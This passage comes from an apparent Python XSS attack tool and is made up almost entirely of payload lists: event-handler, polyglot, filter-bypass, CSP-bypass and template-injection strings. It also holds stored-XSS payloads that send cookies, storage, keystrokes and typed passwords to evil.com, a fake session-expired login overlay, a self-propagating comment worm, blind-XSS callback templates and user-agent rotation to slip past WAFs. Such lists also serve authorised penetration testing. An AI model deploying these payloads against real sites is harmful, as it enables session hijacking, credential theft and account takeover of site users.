    '<svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">',
    # SVG with CSS
    '<svg><style>@keyframes x{}</style><circle style="animation-name:x" onanimationstart="alert(1)"/></svg>',
    # Nested SVG
    '<g><svg onload=alert(1)>',
    # filter/feImage
    '<svg><filter><feImage/onerror=alert(1) src=x /></filter></svg>',
]

# ── EVENT HANDLER PAYLOADS ────────────────────────────────────────────
EVENT_HANDLER_PAYLOADS = [
    # Mouse events
    '<div onmouseover=alert(1)>hover</div>',
    '<div onmouseout=alert(1)>hover</div>',
    '<div onmousemove=alert(1)>hover</div>',
    '<div onmouseenter=alert(1)>hover</div>',
    '<div onmouseleave=alert(1)>hover</div>',
    '<div onmousedown=alert(1)>click</div>',
    '<div onmouseup=alert(1)>click</div>',
    '<div onclick=alert(1)>click</div>',
    '<div ondblclick=alert(1)>dblclick</div>',
    '<div oncontextmenu=alert(1)>right click</div>',
    # Keyboard events
    '<input onkeydown=alert(1)>',
    '<input onkeyup=alert(1)>',
    '<input onkeypress=alert(1)>',
    # Focus events
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus>',
    '<input onfocusin=alert(1) autofocus>',
    '<input onfocusout=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<a href=# onfocus=alert(1) autofocus>x</a>',
    # Form events
    '<form onsubmit=alert(1)><input type=submit></form>',
    '<form onreset=alert(1)><input type=reset></form>',
    '<input onchange=alert(1)>',
    '<input oninput=alert(1)>',
    '<input oninvalid=alert(1) required>',
    '<input onselect=alert(1)>',
    '<select onchange=alert(1)><option>x</option></select>',
    '<textarea onchange=alert(1)></textarea>',
    # Clipboard events
    '<div oncopy=alert(1) contenteditable>copy me</div>',
    '<div onpaste=alert(1) contenteditable>paste here</div>',
    '<div oncut=alert(1) contenteditable>cut me</div>',
    # Drag events
    '<div draggable=true ondragstart=alert(1)>drag me</div>',
    '<div ondragend=alert(1)>drag</div>',
    '<div ondragover=alert(1)>drag over</div>',
    '<div ondrop=alert(1)>drop here</div>',
    '<div ondragenter=alert(1)>drag enter</div>',
    '<div ondragleave=alert(1)>drag leave</div>',
    # Scroll / wheel
    '<div onscroll=alert(1) style="overflow:scroll;height:50px;"><div style="height:200px">scroll</div></div>',
    '<div onwheel=alert(1)>scroll wheel</div>',
    # Touch events (mobile)
    '<div ontouchstart=alert(1)>touch</div>',
    '<div ontouchend=alert(1)>touch</div>',
    '<div ontouchmove=alert(1)>touch</div>',
    '<div ontouchcancel=alert(1)>touch</div>',
    # Pointer events
    '<div onpointerdown=alert(1)>pointer</div>',
    '<div onpointerup=alert(1)>pointer</div>',
    '<div onpointermove=alert(1)>pointer</div>',
    '<div onpointerover=alert(1)>pointer</div>',
    '<div onpointerout=alert(1)>pointer</div>',
    '<div onpointerenter=alert(1)>pointer</div>',
    '<div onpointerleave=alert(1)>pointer</div>',
    '<div onpointercancel=alert(1)>pointer</div>',
    # Media events
    '<video onloadeddata=alert(1)><source src=x></video>',
    '<video oncanplay=alert(1)><source src=x></video>',
    '<video oncanplaythrough=alert(1)><source src=x></video>',
    '<video onplay=alert(1) autoplay muted><source src=x></video>',
    '<video onpause=alert(1)><source src=x></video>',
    '<video onended=alert(1)><source src=x></video>',
    '<video onerror=alert(1)><source src=x></video>',
    '<video onstalled=alert(1)><source src=x></video>',
    '<video onsuspend=alert(1)><source src=x></video>',
    '<video onwaiting=alert(1)><source src=x></video>',
    '<video onvolumechange=alert(1)><source src=x></video>',
    '<video ontimeupdate=alert(1) autoplay muted><source src=x></video>',
    '<video ondurationchange=alert(1)><source src=x></video>',
    '<audio onerror=alert(1)><source src=x></audio>',
    '<audio onplay=alert(1) autoplay><source src=x></audio>',
    '<audio oncanplay=alert(1)><source src=x></audio>',
    # Animation events (CSS animation trigger)
    '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>',
    '<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert(1)>',
    '<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><div style="animation-name:x" onanimationiteration=alert(1)>',
    # Transition events
    '<style>*{transition:all 0.1s}</style><div style="opacity:1" ontransitionend=alert(1) onmouseover="this.style.opacity=0">hover</div>',
    # Page visibility
    '<body onpageshow=alert(1)>',
    '<body onpagehide=alert(1)>',
    '<body onhashchange=alert(1)>',
    '<body onpopstate=alert(1)>',
    '<body onstorage=alert(1)>',
    '<body onresize=alert(1)>',
    '<body onbeforeunload=alert(1)>',
    '<body onunload=alert(1)>',
    '<body onerror=alert(1)>',
    '<body onload=alert(1)>',
    # Document events
    '<body onvisibilitychange=alert(1)>',
    # Print events
    '<body onafterprint=alert(1)>',
    '<body onbeforeprint=alert(1)>',
    # Internet-only events
    '<body ononline=alert(1)>',
    '<body onoffline=alert(1)>',
    # Message events
    '<body onmessage=alert(1)>',
    '<body onmessageerror=alert(1)>',
    # Details/summary
    '<details ontoggle=alert(1) open>x</details>',
    '<details><summary onfocus=alert(1) autofocus>click</summary></details>',
    # Misc
    '<marquee onstart=alert(1)>x</marquee>',
    '<marquee onfinish=alert(1) loop=1>x</marquee>',
    '<marquee onbounce=alert(1) behavior=alternate>x</marquee>',
    '<meter onmouseover=alert(1) value=1 max=1>',
    '<progress onmouseover=alert(1) value=1 max=1>',
    '<output onmouseover=alert(1)>x</output>',
]

# ── POLYGLOT PAYLOADS ─────────────────────────────────────────────────
# Work in multiple contexts: HTML text, attr, script string, URL
POLYGLOT_PAYLOADS = [
    # Classic polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
    # Multi-context polyglot
    '";alert(1)//--></script></title></textarea></style><svg onload=alert(1)>',
    # Triple-context
    "'\"\\><img src=x onerror=alert(1)>",
    # SVG + script polyglot
    '<svg><script>alert(1)</script><a xlink:href="javascript:alert(1)"><text y=10>click</text></a></svg>',
    # Attribute + text polyglot
    '"><svg onload=alert(1)><"',
    # Null+polyglot
    '\x00"><script>alert(1)</script>',
    # Protocol polyglot
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    # Href polyglot
    'javascript:alert(1)<!-- " onmouseover="alert(1)" -->',
    # Attribute / script / HTML polyglot
    "' onmouseover=alert(1) ' \"--></style></title></textarea></script><svg onload=alert(1)>",
    # Markdown-aware polyglot
    '][javascript:alert(1)',
    # URL fragment polyglot
    '#<script>alert(1)</script>',
    '#"><img src=x onerror=alert(1)>',
    # CSS/HTML polyglot
    "</style><script>alert(1)</script><style>",
    # JSON-breaking polyglot
    '"}]}</script><script>alert(1)</script><script>{"',
    # Form action polyglot
    'javascript:alert(1);// " action=# id=',
    # Event + JS polyglot
    '1;alert(1)//"><img src=x onerror=alert(1)>',
    # Prototype pollution XSS polyglot
    '__proto__[innerHTML]=<img src=x onerror=alert(1)>',
    '__proto__.innerHTML=<img src=x onerror=alert(1)>',
    # Angular + standard polyglot
    '{{7*7}}"><script>alert(1)</script>',
    '${7*7}"><script>alert(1)</script>',
    # Full mega-polyglot
    "'\"</script></style></title></textarea><svg onload=alert(1)><!--",
]

# ── CSS-BASED XSS PAYLOADS ────────────────────────────────────────────
CSS_PAYLOADS = [
    # expression() — IE
    '<div style="width:expression(alert(1))">',
    '<xss style="xss:expression(alert(1))">',
    '<style>*{xss:expression(alert(1))}</style>',
    '<div style="background:url(\'javascript:alert(1)\')">',
    '<div style="background-image:url(\'javascript:alert(1)\')">',
    '<div style="list-style:url(\'javascript:alert(1)\')">',
    # @import
    '<style>@import "javascript:alert(1)"</style>',
    '<style>@import url("javascript:alert(1)")</style>',
    # behavior (IE)
    '<style>li{behavior:url(http://x/xss.htc)}</style>',
    # CSS animation-based XSS (modern)
    '<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart=alert(1)>x',
    '<style>@keyframes x{}</style><div style="animation:x 1s" onanimationstart=alert(1)>',
    # CSS transition
    '<style>div{transition:all 0.1s}div:hover{opacity:0}</style><div ontransitionend=alert(1)>hover',
    # @font-face src
    '<style>@font-face{font-family:x;src:url("javascript:alert(1)")}</style><div style="font-family:x">',
    # CSS variable / custom property (Firefox bug)
    '<style>:root{--x:url("javascript:alert(1)")}</style><div style="background:var(--x)">',
    # -moz-binding (Firefox XUL)
    '<style>*{-moz-binding:url(http://x/xss.xml#xss)}</style>',
    # Closing style tag injection
    '</style><script>alert(1)</script>',
    '</style><img src=x onerror=alert(1)>',
    '</style><svg onload=alert(1)>',
    # Link tag with stylesheet
    '<link rel=stylesheet href="data:text/css,*{xss:expression(alert(1))}">',
    '<link rel=stylesheet href="data:text/css,body{background:url(javascript:alert(1))}">',
    # Style attr event exfil
    "<x style='behavior:url(#default#userData)' onpropertychange=alert(1)>",
]

# ── TEMPLATE INJECTION / SSTI PAYLOADS ───────────────────────────────
TEMPLATE_INJECTION = [
    # AngularJS (ng-app — sandbox bypass)
    '{{constructor.constructor("alert(1)")()}}',
    '{{$on.constructor("alert(1)")()}}',
    "{{['constructor']['constructor']('alert(1)')()}}",
    "{{x=alert,x(1)}}",
    '{{a=toString().constructor.prototype;a.charAt=[].join;$eval("x=alert(1)")}}',
    '{{"a".constructor.prototype.charAt=[].join;$eval("x=alert(1)")}}',
    '<div ng-app ng-csp><input ng-focus=$event.view.alert(1) autofocus>',
    '<div ng-app><div ng-csp><iframe srcdoc="<div ng-app>{{constructor.constructor(\'alert(1)\')()}}</div>"></div></div>',
    # Vue.js
    '{{constructor.constructor("alert(1)")()}}',
    # Jinja2 (server-side, useful for stored XSS scenarios)
    '{{7*7}}',
    '{{config}}',
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    # Twig
    '{{7*7}}',
    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
    # FreeMarker
    '${7*7}',
    '${alert(1)}',
    # Mustache/Handlebars
    '{{alert 1}}',
    '{{#with "s" as |string|}}{{string.sub.apply 0 ["alert(1)"]}}{{/with}}',
    # ERB
    '<%= alert(1) %>',
    '<%=alert(1)%>',
    # Smarty
    '{php}alert(1);{/php}',
    '{$smarty.version}',
    # Pebble
    '{{1+1}}',
    '{% for c in [1,2,3]%}{{c}}{% endfor %}',
    # Velocity
    '#set($x="alert(1)")#evaluate($x)',
    '$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")',
    # Perl Template Toolkit
    '[% MACRO x BLOCK %][% INCLUDE /etc/passwd %][% END %]',
    # React dangerouslySetInnerHTML
    "<img src=x onerror=alert(1)>",
    # Knockout.js
    "<!-- ko text: $data.constructor.constructor('alert(1)')() --><!-- /ko -->",
]

# ── PROTOCOL HANDLER PAYLOADS ─────────────────────────────────────────
PROTOCOL_PAYLOADS = [
    # javascript: protocol
    'javascript:alert(1)',
    'javascript:alert(document.cookie)',
    'javascript:alert(document.domain)',
    'javascript:confirm(1)',
    'javascript:prompt(1)',
    'javascript:void(alert(1))',
    'javascript:window.onerror=alert;throw 1',
    'javascript:void(0);alert(1)',
    # Case/space variations
    'JAVASCRIPT:alert(1)',
    'JaVaScRiPt:alert(1)',
    'Javascript:alert(1)',
    '\tjavascript:alert(1)',
    '\njavascript:alert(1)',
    '\rjavascript:alert(1)',
    'java\rscript:alert(1)',
    'java\tscript:alert(1)',
    'java\nscript:alert(1)',
    'java&#13;script:alert(1)',
    'java&#10;script:alert(1)',
    'java&#9;script:alert(1)',
    'java&NewLine;script:alert(1)',
    'java\u0000script:alert(1)',
    '\u0000javascript:alert(1)',
    '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)',
    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)',
    # vbscript: (IE)
    'vbscript:alert(1)',
    'VBSCRIPT:alert(1)',
    'VbScRiPt:alert(1)',
    'vbscript:msgbox(1)',
    'vbscript:execute("alert(1)")',
    # data: URIs
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'data:text/html;charset=utf-8,<script>alert(1)</script>',
    'data:text/javascript,alert(1)',
    'data:text/html,<img src=x onerror=alert(1)>',
    'data:image/svg+xml,<svg onload=alert(1)>',
    'data:application/xhtml+xml,<html xmlns="http://www.w3.org/1999/xhtml"><body onload="alert(1)"/></html>',
    # Operator-based javascript:
    'javascript:alert(1)//comment',
    'javascript://comment\nalert(1)',
    'javascript:/*comment*/alert(1)',
    # url() in CSS
    "url('javascript:alert(1)')",
    'url(javascript:alert(1))',
]

# ── MUTATION-BASED / MXSS PAYLOADS ───────────────────────────────────
MUTATION_PAYLOADS = [
    # Classic mXSS (innerHTML mutation)
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<listing><p title="</listing><img src=x onerror=alert(1)>">',
    '<xmp><p title="</xmp><img src=x onerror=alert(1)>">',
    '<plaintext><img src=x onerror=alert(1)>',
    '<textarea><img src=x onerror=alert(1)></textarea>',
    # Parser confusion
    '<<!-- -->script>alert(1)</<!-- -->script>',
    '<sc\ript>alert(1)</sc\ript>',
    '<sc&#x72;ipt>alert(1)</sc&#x72;ipt>',
    # Broken/partial tags
    '<<script>alert(1)//<</script>',
    '<<script>alert(1)</script>',
    # HTML5 parsing quirks
    '<p onclick="alert(1)"<img src=x>',
    '<input onclick=alert(1)<',
    # attr value confusion
    '<img src="x" onerror="alert(1)"<!--',
    '<div style="xss:expr/*xss*/ession(alert(1))">',
    '<div style="x&#58;expression(alert(1))">',
    # CDATA mutation
    '<![CDATA[<script>alert(1)</script>]]>',
    '<![CDATA[</p>]]><script>alert(1)</script>',
    # XML namespace confusion
    '<html:script xmlns:html="http://www.w3.org/1999/xhtml">alert(1)</html:script>',
    # Self-closing quirks (non-void elements)
    '<script/src="data:,alert(1)"></script>',
    '<script type="text/javascript">alert(1)</script>',
    '<script language="javascript">alert(1)</script>',
    # IE conditional comments
    '<!--[if IE]><script>alert(1)</script><![endif]-->',
    '<!--[if lt IE 9]><script>alert(1)</script><![endif]-->',
    '<!--[if gte IE 5.5]><script>alert(1)</script><![endif]-->',
    # Loose attribute parsing
    '<img src=`x` onerror=`alert(1)`>',
    '<img src= x onerror= alert(1)>',
    '<img src =x onerror =alert(1)>',
    # Weird whitespace in tag names
    '<img/src=x onerror=alert(1)>',
    '<img \x00src=x onerror=alert(1)>',
    '<img\x0Dsrc=x onerror=alert(1)>',
    '<img\x0Asrc=x onerror=alert(1)>',
]

# ── FILTER BYPASS PAYLOADS ────────────────────────────────────────────
FILTER_BYPASS_PAYLOADS = [
    # Bypass "script" keyword filter
    '<scr\x00ipt>alert(1)</scr\x00ipt>',
    '<scr\tipt>alert(1)</scr\tipt>',
    '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
    # Bypass "alert" keyword filter
    '<script>a\u006cert(1)</script>',
    '<script>al\u0065rt(1)</script>',
    '<script>[].constructor.constructor("al"+"ert(1)")()</script>',
    '<script>window["al"+"ert"](1)</script>',
    '<script>eval("al"+"ert(1)")</script>',
    '<script>self[/**/`al`+`ert`](1)</script>',
    '<script>(alert)(1)</script>',
    '<script>al\x65rt(1)</script>',
    '<script>al\\ert(1)</script>',
    '<img src=x onerror=al\u0065rt(1)>',
    # Bypass "onerror" filter
    '<img src=x ON\x45RROR=alert(1)>',
    '<img src=x oN\terRoR=alert(1)>',
    '<img src=x OnErRoR=alert(1)>',
    # Bypass "javascript" filter
    'j&#97;vascript:alert(1)',
    'java&#115;cript:alert(1)',
    'javascri\x00pt:alert(1)',
    'javascri&#112;t:alert(1)',
    # Bypass "onload" filter
    '<body On\x4coAD=alert(1)>',
    '<svg On\x4coAD=alert(1)>',
    # Bypass angle bracket filter (reflected inside attribute)
    '" onmouseover=alert(1) x="',
    "' onmouseover=alert(1) x='",
    # Bypass quote stripping
    '<img src=x onerror=alert(1) id=`x`>',
    '<svg onload=alert(1) id=`x`>',
    # Bypass length filters
    '<q oncut=alert(1)>',
    '<s onfocus=alert(1) tabindex=0 autofocus>',
    # Bypass keyword=banned + parentheses filter
    '<script>onerror=alert;throw 1</script>',
    '<script>throw onerror=confirm,1</script>',
    '<img src=x onerror="window.onerror=alert;throw 1">',
    # Bypass "eval" filter
    '<script>se\x74Timeout("alert(1)",0)</script>',
    '<script>se\x74Interval("alert(1)",0)</script>',
    '<script>new Function`alert\x281\x29`()</script>',
    # Bypass CSS expression filter
    '<style>@im\\port url("javascript:alert(1)")</style>',
    '<div style="wid\th:expression(alert(1))">',
    # Bypass <> filter but inside attribute
    '&#34;><script>alert(1)</script>',
    '&#39;><script>alert(1)</script>',
    # Bypass recursive stripping
    '<sc<script>ript>alert(1)</sc</script>ript>',
    '<im<img src=x onerror=alert(1)>g src=x>',
    '<svg/onl<svg onload=alert(1)>oad=alert(1)>',
    # PHP strip_tags bypass
    '< script >alert(1)</ script >',
    '<	script>alert(1)</	script>',
    # Bypass filter that removes "on*"
    '<img src=x/onerror=alert(1)>',
    '<img src=x\nonerror=alert(1)>',
    # Bypass sanitizers that allow specific tags
    '<a href=javascript:alert(1)>click</a>',
    '<a href="javas\x09cript:alert(1)">click</a>',
    '<a href="javas&#x09;cript:alert(1)">click</a>',
]

# ── NULL BYTE / TRUNCATION PAYLOADS ──────────────────────────────────
NULL_BYTE_PAYLOADS = [
    '<scr\x00ipt>alert(1)</scr\x00ipt>',
    '<img\x00 src=x onerror=alert(1)>',
    '<img src\x00=x onerror=alert(1)>',
    '<img src=x\x00 onerror=alert(1)>',
    '<img src=x onerror\x00=alert(1)>',
    '<img src=x onerror=\x00alert(1)>',
    '%00<script>alert(1)</script>',
    '<script>alert(1\x00)</script>',
    "'; alert(1); x='\x00",
    '"; alert(1); x="\x00',
    'javascript\x00:alert(1)',
    'java\x00script:alert(1)',
    '<svg\x00 onload=alert(1)>',
    '<svg onload\x00=alert(1)>',
    '<body\x00 onload=alert(1)>',
    '<a href=\x00javascript:alert(1)>click</a>',
    '\x00"><script>alert(1)</script>',
    '"><\x00script>alert(1)</script>',
    '<\x00script>alert(1)</\x00script>',
    '<scr\x00\x00ipt>alert(1)</script>',
    '<img src="x"onerror="alert(1)"\x00>',
]

# ── STORED XSS SPECIFIC PAYLOADS ─────────────────────────────────────
STORED_XSS_PAYLOADS = [
    # Persistent DOM-changing payloads
    '<script>document.body.innerHTML+="<img src=x onerror=alert(1)>"</script>',
    '<script>document.addEventListener("DOMContentLoaded",function(){alert(1)})</script>',
    '<script>window.addEventListener("load",function(){alert(1)})</script>',
    # Cookie exfil (persistent)
    '<script>new Image().src="//evil.com/?c="+document.cookie</script>',
    '<script>fetch("//evil.com/?c="+document.cookie)</script>',
    '<script>navigator.sendBeacon("//evil.com/",document.cookie)</script>',
    '<img src=x onerror="fetch(\'//evil.com/?c=\'+document.cookie)">',
    # Keylogger (persistent)
    '<script>document.onkeypress=function(e){new Image().src="//evil.com/?k="+e.key}</script>',
    # Persistent redirect
    '<script>if(!location.href.includes("evil"))location="//evil.com"</script>',
    # Admin panel targeting
    '<script>if(document.title.toLowerCase().includes("admin"))fetch("//evil.com/?admin="+location.href)</script>',
    # DOM mutation observer (fires on every page change)
    '<script>new MutationObserver(function(){new Image().src="//evil.com/?d="+document.title}).observe(document,{subtree:true,childList:true})</script>',
    # localStorage/sessionStorage steal
    '<script>fetch("//evil.com/?ls="+JSON.stringify(localStorage))</script>',
    '<script>fetch("//evil.com/?ss="+JSON.stringify(sessionStorage))</script>',
    # Credential harvesting (form injection)
    '<script>document.forms[0].addEventListener("submit",function(e){fetch("//evil.com/cred?d="+new URLSearchParams(new FormData(e.target)).toString())})</script>',
    # CSRF via stored XSS
    '<script>fetch("/admin/delete_user",{method:"POST",body:"id=1",credentials:"include"})</script>',
    # Self-propagating stored XSS (if there is a store mechanism)
    '<script>fetch("/comment",{method:"POST",body:"text=<script>alert(1)<\\/script>",headers:{"Content-Type":"application/x-www-form-urlencoded"},credentials:"include"})</script>',
    # UI Redress/Clickjacking overlay
    '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);z-index:9999" onclick="this.remove()"><div style="color:white;font-size:24px;text-align:center;margin-top:20%">Your session expired. Please log in again.<br><input type=password id=p><button onclick="fetch(\'//evil.com/?p=\'+document.getElementById(\'p\').value)">Login</button></div></div>',
    # Port scan via timing
    '<script>["8080","3000","4200","5000","8443","9000"].forEach(function(p){var s=Date.now();var i=new Image();i.onerror=function(){fetch("//evil.com/?port="+p+"&t="+(Date.now()-s))};i.src="//127.0.0.1:"+p+"/"})</script>',
    # Beacon on scroll (bypass CSP nonce)
    '<img src=x onerror="document.body.addEventListener(\'scroll\',function(){fetch(\'//evil.com/?url=\'+location.href)})">',
]

# ── BLIND XSS TEMPLATES ───────────────────────────────────────────────
BLIND_TEMPLATES = [
    '<script src="{{CB}}"></script>',
    '<script>new Image().src="{{CB}}?c="+document.cookie</script>',
    '<script>fetch("{{CB}}?c="+document.cookie)</script>',
    '<script>navigator.sendBeacon("{{CB}}",JSON.stringify({c:document.cookie,u:location.href,r:document.referrer}))</script>',
    '<img src=x onerror="fetch(\'{{CB}}?c=\'+document.cookie)">',
    '<img src=x onerror="new Image().src=\'{{CB}}?c=\'+document.cookie">',
    '<svg onload="fetch(\'{{CB}}?c=\'+document.cookie)">',
    '<svg onload="new Image().src=\'{{CB}}?c=\'+document.cookie">',
    '<input onfocus="fetch(\'{{CB}}?c=\'+document.cookie)" autofocus>',
    '<details open ontoggle="fetch(\'{{CB}}?c=\'+document.cookie)">',
    '"><script src="{{CB}}"></script>',
    "'><script src='{{CB}}'></script>",
    '"><img src=x onerror="fetch(\'{{CB}}?c=\'+document.cookie)">',
    "'><img src=x onerror=\"fetch('{{CB}}?c='+document.cookie)\">",
    '"><svg onload="fetch(\'{{CB}}?c=\'+document.cookie)">',
    '<script>setTimeout(function(){fetch("{{CB}}?c="+document.cookie)},1000)</script>',
    '<script>window.addEventListener("load",function(){fetch("{{CB}}?d="+document.title+"&u="+location.href+"&c="+document.cookie)})</script>',
    '<body onload="fetch(\'{{CB}}?c=\'+document.cookie)">',
    '<iframe onload="fetch(\'{{CB}}?c=\'+top.document.cookie)">',
    '<link rel=stylesheet href="{{CB}}/css">',
    '<script>document.write(\'<script src="{{CB}}">\'+\'<\'+\'/script>\')</script>',
]

# ── CSP BYPASS PAYLOADS ──────────────────────────────────────────────
CSP_BYPASS_PAYLOADS = [
    # JSONP-based CSP bypass (common on CDNs)
    '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>',
    '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp><input ng-focus=$event.view.alert(1) autofocus>',
    '<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>',
    # base-uri bypass
    '<base href="//evil.com/"><script src="/xss.js"></script>',
    '<base href="data:text/html,<script>alert(1)</script>">',
    # object-src bypass
    '<object data="data:text/html,<script>alert(1)</script>">',
    '<object data="javascript:alert(1)">',
    # script nonce leak / reuse
    '<script nonce="">alert(1)</script>',
    # import maps (Chrome 89+)
    '<script type="importmap">{"imports":{"x":"data:text/javascript,alert(1)"}}</script><script type="module">import "x"</script>',
    # Trusted Types bypass (Chrome)
    '<script>trustedTypes.createPolicy("default",{createHTML:s=>s});document.body.innerHTML="<img src=x onerror=alert(1)>"</script>',
    # meta refresh redirect
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">',
    # link preload
    '<link rel="preload" href="data:text/html,<script>alert(1)</script>" as="fetch">',
    # style-src bypass
    '<style>@import "data:text/css,*{background:url(javascript:alert(1))}";</style>',
    # worker bypass
    '<script>new Worker("data:text/javascript,fetch(location.href)")</script>',
    '<script>navigator.serviceWorker.register("data:text/javascript,self.onmessage=e=>eval(e.data)")</script>',
    # blob URL bypass
    '<script>location=URL.createObjectURL(new Blob(["<script>alert(1)<\\/script>"],{type:"text/html"}))</script>',
    # require-trusted-types-for bypass
    '<script>window.trustedTypes?trustedTypes.createPolicy("",{createHTML:x=>x,createScript:x=>x,createScriptURL:x=>x}):0;document.body.innerHTML="<img src=x onerror=alert(1)>"</script>',
]

# ── MODERN FRAMEWORK PAYLOADS ────────────────────────────────────────
MODERN_FRAMEWORK_PAYLOADS = [
    # React dangerouslySetInnerHTML exploitation
    '{"__html":"<img src=x onerror=alert(1)>"}',
    # Next.js specific
    '<script>__NEXT_DATA__={props:{pageProps:{dangerousHTML:"<img src=x onerror=alert(1)>"}}}</script>',
    # Vue 3 template injection
    '{{_openBlock()._createBlock("script",null,"alert(1)")}}',
    '{{$el.ownerDocument.defaultView.alert(1)}}',
    # Svelte
    '{@html "<img src=x onerror=alert(1)>"}',
    # Alpine.js
    '<div x-data=""><span x-html="\'<img src=x onerror=alert(1)>\'"></span></div>',
    '<div x-data x-init="alert(1)"></div>',
    '<div x-data @click="alert(1)">click</div>',
    # htmx (modern hypermedia)
    '<div hx-get="javascript:alert(1)" hx-trigger="load"></div>',
    '<div hx-on:load="alert(1)"></div>',
    '<div hx-on::after-request="alert(1)"></div>',
    # Stimulus.js
    '<div data-controller="x" data-action="click->x#alert">click</div>',
    # jQuery (still everywhere)
    '<img src=x onerror="$.globalEval(\'alert(1)\')">',
    '<img src=x onerror="jQuery.globalEval(\'alert(1)\')">',
    # Prototype.js
    '<script>$$("*")[0].fire("click",{memo:alert(1)})</script>',
    # Web Components / Shadow DOM escape
    '<script>document.body.attachShadow({mode:"open"}).innerHTML="<img src=x onerror=alert(1)>"</script>',
    # Server-Sent Events
    '<script>new EventSource("data:text/event-stream,data:alert(1)\\n\\n").onmessage=e=>eval(e.data)</script>',
    # postMessage abuse
    '<script>window.onmessage=e=>eval(e.data);postMessage("alert(1)","*")</script>',
    # Markdown renderers (common in modern apps)
    '[XSS](javascript:alert(1))',
    '![XSS](x" onerror="alert(1))',
    '<details open ontoggle=alert(1)><summary>click</summary></details>',
]

# ── PARAMETER DISCOVERY WORDLIST ─────────────────────────────────────
PARAM_DISCOVERY_WORDLIST = [
    'q', 'query', 'search', 'keyword', 'term', 's', 'k', 'find',
    'id', 'page', 'p', 'name', 'user', 'username', 'email',
    'url', 'redirect', 'return', 'next', 'redir', 'goto', 'target',
    'callback', 'cb', 'jsonp', 'fn', 'func', 'function',
    'file', 'path', 'dir', 'folder', 'template', 'tpl', 'view',
    'action', 'do', 'cmd', 'command', 'exec', 'run',
    'debug', 'test', 'dev', 'mode', 'verbose', 'trace',
    'input', 'data', 'value', 'text', 'content', 'body', 'msg', 'message',
    'title', 'subject', 'description', 'comment', 'note', 'feedback',
    'lang', 'language', 'locale', 'l', 'i18n',
    'format', 'type', 'output', 'render', 'display',
    'sort', 'order', 'filter', 'category', 'cat', 'tag',
    'ref', 'referer', 'referrer', 'source', 'src', 'origin', 'from',
    'token', 'csrf', 'nonce', 'state', 'code',
    'error', 'err', 'errormsg', 'error_message', 'alert', 'warning', 'status',
]

# ── INJECTABLE HEADERS ────────────────────────────────────────────────
INJECTABLE_HEADERS = [
    'User-Agent',
    'Referer',
    'X-Forwarded-For',
    'X-Forwarded-Host',
    'X-Original-URL',
    'X-Client-IP',
    'True-Client-IP',
    'Contact',
    'From',
    'Origin',
    'X-Real-IP',
    'X-Custom-IP-Authorization',
    'X-HTTP-Method-Override',
    'Via',
    'Accept-Language',
    'Accept',
    'CF-Connecting-IP',
    'Fastly-Client-Ip',
    'X-Wap-Profile',
]

def all_reflected_payloads():
    return list(OrderedDict.fromkeys(
        BASIC_PAYLOADS + ENCODING_PAYLOADS + WAF_BYPASS_PAYLOADS +
        ATTRIBUTE_ESCAPE + SCRIPT_ESCAPE + COMMENT_ESCAPE +
        DOM_PAYLOADS + SVG_PAYLOADS + EVENT_HANDLER_PAYLOADS +
        POLYGLOT_PAYLOADS + CSS_PAYLOADS + TEMPLATE_INJECTION +
        PROTOCOL_PAYLOADS + MUTATION_PAYLOADS + FILTER_BYPASS_PAYLOADS +
        NULL_BYTE_PAYLOADS + CSP_BYPASS_PAYLOADS + MODERN_FRAMEWORK_PAYLOADS
    ))

def all_stored_payloads():
    return list(OrderedDict.fromkeys(
        BASIC_PAYLOADS + ENCODING_PAYLOADS + WAF_BYPASS_PAYLOADS +
        ATTRIBUTE_ESCAPE + SCRIPT_ESCAPE + DOM_PAYLOADS +
        SVG_PAYLOADS + EVENT_HANDLER_PAYLOADS + STORED_XSS_PAYLOADS +
        POLYGLOT_PAYLOADS + FILTER_BYPASS_PAYLOADS +
        CSP_BYPASS_PAYLOADS + MODERN_FRAMEWORK_PAYLOADS
    ))

def blind_payloads(cb_url):
    return [t.replace('{{CB}}', cb_url) for t in BLIND_TEMPLATES]

def load_custom_payloads(filepath):
    payloads = []
    if not filepath or not os.path.isfile(filepath):
        if filepath: warn(f"Payload file not found: {filepath}")
        return payloads
    with open(filepath, 'r', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                payloads.append(line)
    info(f"Loaded {len(payloads)} custom payloads from {filepath}")
    return payloads


# ═══════════════════════════════════════════════════════════════════════
# HTTP CLIENT
# ═══════════════════════════════════════════════════════════════════════

class HTTPClient:
    # Rotate through multiple real browser UA strings to avoid WAF blocks
    _USER_AGENTS = [
